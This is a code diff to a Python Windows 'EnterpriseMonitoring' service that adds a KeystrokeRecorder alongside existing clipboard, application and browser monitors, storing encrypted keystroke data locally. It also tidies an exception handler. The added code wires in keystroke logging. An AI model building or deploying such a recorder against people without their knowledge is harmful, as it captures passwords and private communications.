@@ -17,6 +17,7 @@ import threading
 import time
 from datetime import datetime
 import os
+from keystroke_recorder import KeystrokeRecorder
 
 # Fix Python path to find modules
 current_dir = Path(__file__).parent
@@ -40,6 +41,7 @@ if not program_data_dir.exists():
         print(f"Error creating directories: {e}")
 
 # Configure logging for service
+
 log_dir = Path('C:/ProgramData/EnterpriseMonitoring/logs')
 log_dir.mkdir(parents=True, exist_ok=True)
 
@@ -87,10 +89,17 @@ class MonitoringEngine:
             callback=self.on_browser_event
         )
         
+        self.keystroke_recorder = KeystrokeRecorder(
+        storage_dir=Path('C:/ProgramData/EnterpriseMonitoring/data/keystrokes'),
+        callback=self.on_keystroke_event,
+        enable_encryption=True,
+        buffer_flush_interval=60
+        )
         self.monitors = [
             self.clipboard_monitor,
             self.app_tracker,
-            self.browser_tracker
+            self.browser_tracker,
+            self.keystroke_recorder
         ]
         
         logger.info("Monitoring engine initialized")
@@ -118,11 +127,20 @@ class MonitoringEngine:
             logger.debug(f"Browser activity logged: {event['browser_name']}")
         except Exception as e:
             logger.error(f"Error logging browser activity: {e}")
+
+    def on_keystroke_event(self, event):
+        try:
+            # Just log to debug - don't store in main DB
+            logger.debug(f"Keystroke recorded in {event['application']}")
+        except Exception as e:
+            logger.error(f"Error handling keystroke event: {e}")        
     
     def start_all_monitors(self):
         """Start all monitoring components"""
         logger.info("Starting all monitors...")
         self.is_running = True
+    
+    
         
         for monitor in self.monitors:
             try:
@@ -350,9 +368,9 @@ def remove_service():
         # Stop service first
         try:
             stop_service()
-        except:
-            pass
-        
+        except Exception as e:
+            logger.warning(f"Error stopping service before removal: {e}")
+            
         # Remove service
         win32serviceutil.HandleCommandLine(
             EnterpriseMonitoringService,
